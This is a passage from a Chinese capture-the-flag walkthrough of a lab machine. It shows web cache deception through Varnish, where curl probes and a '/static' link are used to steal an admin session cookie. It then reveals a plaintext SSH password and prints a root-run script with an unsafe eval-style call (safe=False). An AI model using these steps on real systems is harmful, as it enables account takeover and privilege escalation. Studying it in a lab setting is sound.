<p>参考<a href="https://labs.withsecure.com/advisories/plone-cms-cache-poisoning-xss-vulnerability">https://labs.withsecure.com/advisories/plone-cms-cache-poisoning-xss-vulnerability</a></p>
<p>前面在源码看到网站在/static目录加载了很多信息，而且有反向代理Varnish作缓存，那么就用curl测试一下HTTP响应头部字段，如下，可看到<code>curl -I "http://10.10.11.188/"</code>响应头无<code>cache-control</code>字段</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# curl -I "http://10.10.11.188/"
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Tue, 07 Mar 2023 03:50:02 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 5186
X-Varnish: 596113
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Accept-Ranges: bytes
Connection: keep-alive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如下，<code>curl -I "http://10.10.11.188/static/"</code>响应头有<code>cache-control</code>字段，而且该字段设置的权限是<code>public</code>，即可向任意方提供缓存</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# curl -I "http://10.10.11.188/static/"
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Mon, 06 Mar 2023 14:44:46 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
cache-control: public, max-age=240
X-Varnish: 137222 1902052
Age: 47073
Via: 1.1 varnish (Varnish/6.2)
Connection: keep-alive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>curl -I "http://10.10.11.188/static/wa0er"</code>响应头有<code>cache-control</code>字段</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# curl -I "http://10.10.11.188/static/wa0er"
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Tue, 07 Mar 2023 03:49:24 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
cache-control: public, max-age=240
X-Varnish: 137236
Age: 0
Via: 1.1 varnish (Varnish/6.2)
Connection: keep-alive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>继续测试，得到如下结果</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl -I "http://10.10.11.188/staticwa0er"	#有cache-control字段
curl -I "http://10.10.11.188/wa0er/static"	#有cache-control字段
curl -I "http://10.10.11.188/wa0erstatic"	#无cache-control字段<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>由此推测，Varnish应该是匹配”/static”字符串，匹配成功，则返回缓存信息。我们肯定没法通过网站正常的提交提权申请的流程去获得admin权限，但知道用Varnish做了缓存，且<code>cache-control</code>字段有<code>public</code>，那么我们就可以尝试读缓存。</p>
<p>在[Escalate]页面，Link内容填写带有<code>/static</code>的URL，提交提权申请</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307145222841.png" style="zoom:80%;">

<p>然后在本地执行curl请求对应的URL，获取session值（在burp抓包重放也可以）</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl -I http://10.10.11.188/static/wa0er<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307145341063.png"></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">session=c0204f3b-c808-47db-ad92-7e4abbebe2be; HttpOnly; Path=/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>F12→Storage→Cookies，session值改为获取到的session值</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307151247967.png"></p>
<p>重新访问<code>http://10.10.11.188/admin_tickets</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307150928057.png" style="zoom:80%;">

<p>可以看到获取到了diego账户密码</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">diego
dCb#1!x0%gjq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ssh连上去</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307152413918.png"></p>
<h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><p>前面知道diego用户已被提权，所以应该是有sudo权限，可以执行<code>sudo -l</code>看一下diego用户权限，发现有个<code>/opt/security/ml_security.py</code>可以执行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307152612681.png"></p>
<p>看一下内容</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> csv
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> mysql<span class="token punctuation">.</span>connector
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">as</span> parse
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote
<span class="token keyword">from</span> sklearn <span class="token keyword">import</span> model_selection
<span class="token keyword">from</span> nltk<span class="token punctuation">.</span>tokenize <span class="token keyword">import</span> word_tokenize
<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>linear_model <span class="token keyword">import</span> LogisticRegression
<span class="token keyword">from</span> gensim<span class="token punctuation">.</span>models<span class="token punctuation">.</span>doc2vec <span class="token keyword">import</span> Doc2Vec<span class="token punctuation">,</span> TaggedDocument
<span class="token keyword">from</span> tensorflow<span class="token punctuation">.</span>python<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>saved_model_cli <span class="token keyword">import</span> preprocess_input_exprs_arg_string

np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span>

f1 <span class="token operator">=</span> <span class="token string">'/opt/security/lib/DecisionTreeClassifier.sav'</span>
f2 <span class="token operator">=</span> <span class="token string">'/opt/security/lib/SVC.sav'</span>
f3 <span class="token operator">=</span> <span class="token string">'/opt/security/lib/GaussianNB.sav'</span>
f4 <span class="token operator">=</span> <span class="token string">'/opt/security/lib/KNeighborsClassifier.sav'</span>
f5 <span class="token operator">=</span> <span class="token string">'/opt/security/lib/RandomForestClassifier.sav'</span>
f6 <span class="token operator">=</span> <span class="token string">'/opt/security/lib/MLPClassifier.sav'</span>

<span class="token comment"># load the models from disk</span>
loaded_model1 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>f1<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
loaded_model2 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>f2<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
loaded_model3 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>f3<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
loaded_model4 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>f4<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
loaded_model5 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>f5<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
loaded_model6 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>f6<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
model<span class="token operator">=</span> Doc2Vec<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"/opt/security/lib/d2v.model"</span><span class="token punctuation">)</span>

<span class="token comment"># Create a function to convert an array of strings to a set of features</span>
<span class="token keyword">def</span> <span class="token function">getVec</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    features <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i<span class="token punctuation">,</span> line <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
        test_data <span class="token operator">=</span> word_tokenize<span class="token punctuation">(</span>line<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        v1 <span class="token operator">=</span> model<span class="token punctuation">.</span>infer_vector<span class="token punctuation">(</span>test_data<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> v1
        lineDecode <span class="token operator">=</span> unquote<span class="token punctuation">(</span>line<span class="token punctuation">)</span>
        lowerStr <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lineDecode<span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'link'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'object'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'embed'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'ilayer'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'layer'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'applet'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'meta'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature1 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'marquee'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># add feature for malicious method count</span>
        feature2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'fromcharcode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'eval'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'alert'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'getelementsbytagname'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'unescape'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'escape'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'prompt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'onload'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'onclick'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'onerror'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'onpage'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature2 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'confirm'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># add feature for ".js" count</span>
        feature3 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'.js'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># add feature for "javascript" count</span>
        feature4 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'javascript'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># add feature for length of the string</span>
        feature5 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># add feature for "&lt;script"  count</span>
        feature6 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature6 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'&lt;script'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature6 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'&amp;lt;script'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature6 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'%3cscript'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature6 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'%3c%73%63%72%69%70%74'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># add feature for special character count</span>
        feature7 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        feature7 <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'%3C'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># add feature for http count</span>
        feature8 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lowerStr<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        
        <span class="token comment"># append the features</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature1<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature2<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature3<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature4<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature5<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature6<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature7<span class="token punctuation">)</span>
        featureVec <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">,</span>feature8<span class="token punctuation">)</span>
        features<span class="token punctuation">.</span>append<span class="token punctuation">(</span>featureVec<span class="token punctuation">)</span>
    <span class="token keyword">return</span> features

<span class="token comment"># Grab links</span>
conn <span class="token operator">=</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span>database<span class="token operator">=</span><span class="token string">'app'</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">'diego'</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token string">'dCb#1!x0%gjq'</span><span class="token punctuation">)</span>
cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'select reason from escalate'</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
data<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> r<span class="token punctuation">:</span>
        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
Xnew <span class="token operator">=</span> getVec<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token comment">#1 DecisionTreeClassifier</span>
ynew1 <span class="token operator">=</span> loaded_model1<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>Xnew<span class="token punctuation">)</span>
<span class="token comment">#2 SVC</span>
ynew2 <span class="token operator">=</span> loaded_model2<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>Xnew<span class="token punctuation">)</span>
<span class="token comment">#3 GaussianNB</span>
ynew3 <span class="token operator">=</span> loaded_model3<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>Xnew<span class="token punctuation">)</span>
<span class="token comment">#4 KNeighborsClassifier</span>
ynew4 <span class="token operator">=</span> loaded_model4<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>Xnew<span class="token punctuation">)</span>
<span class="token comment">#5 RandomForestClassifier</span>
ynew5 <span class="token operator">=</span> loaded_model5<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>Xnew<span class="token punctuation">)</span>
<span class="token comment">#6 MLPClassifier</span>
ynew6 <span class="token operator">=</span> loaded_model6<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>Xnew<span class="token punctuation">)</span>

<span class="token comment"># show the sample inputs and predicted outputs</span>
<span class="token keyword">def</span> <span class="token function">assessData</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    score <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">.175</span><span class="token operator">*</span>ynew1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">.15</span><span class="token operator">*</span>ynew2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">.05</span><span class="token operator">*</span>ynew3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">.075</span><span class="token operator">*</span>ynew4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">.25</span><span class="token operator">*</span>ynew5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">.3</span><span class="token operator">*</span>ynew6<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> score <span class="token operator">&gt;=</span> <span class="token number">.5</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
                preprocess_input_exprs_arg_string<span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>safe<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
                <span class="token keyword">pass</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Xnew<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>assessData<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#     t.daemon = True</span>
     t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>分析一下代码功能</p>
<ol>
<li>从app数据库escalate表的reason列取值（代码112-121行），将此值作为输入，匹配其中的特征字段（代码45-98行的feature）作为特征向量（不必纠结特征向量是个什么东西）</li>
<li>然后用若干种机器学习模型（代码123-134行）去预测输出</li>
<li>最后对输出把输入和输出都序列化成某种数据格式（代码136-148，这里的数据格式不必过分纠结，估计是为了看着方便）</li>
</ol>
